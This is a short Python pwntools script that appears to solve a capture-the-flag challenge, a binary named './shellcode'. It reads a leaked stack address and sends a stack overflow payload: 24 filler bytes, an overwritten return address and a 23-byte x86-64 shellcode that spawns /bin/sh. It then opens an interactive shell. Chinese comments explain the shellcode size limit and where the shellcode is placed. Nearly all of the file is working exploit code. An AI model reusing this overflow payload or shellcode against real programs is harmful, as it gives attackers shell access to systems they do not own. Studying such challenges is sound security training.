#!/usr/bin/python
#coding:utf-8

from pwn import *

context.binary = './shellcode'

p = process('./shellcode')

p.recvuntil('Do your kown what is it : [')

target = p.recvuntil(']',drop=True)
target = int(target,16)

#shellcode = asm(shellcraft.sh())  #自动生成的shellcode的长度是48，因为这块空间最多只能写入24字节,所以得自己找个小的shellcode
#print shellcode

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"  #这个64位的shellcode仅23字节
print 'shellcode的长度是'+str(len(shellcode))

#payload = shellcode.ljust(24,'a') + p64(target)  
#但是因为这个shellcode本身是有push指令的
#这时候如果我们把shellcode放在最前面，在程序leave的时候，在执行这些就会被覆盖。
#所以这里把shellcode放到了后面
payload = 'a'*24 + p64(target + 32) + shellcode 
print payload

p.sendline(payload)

p.interactive()


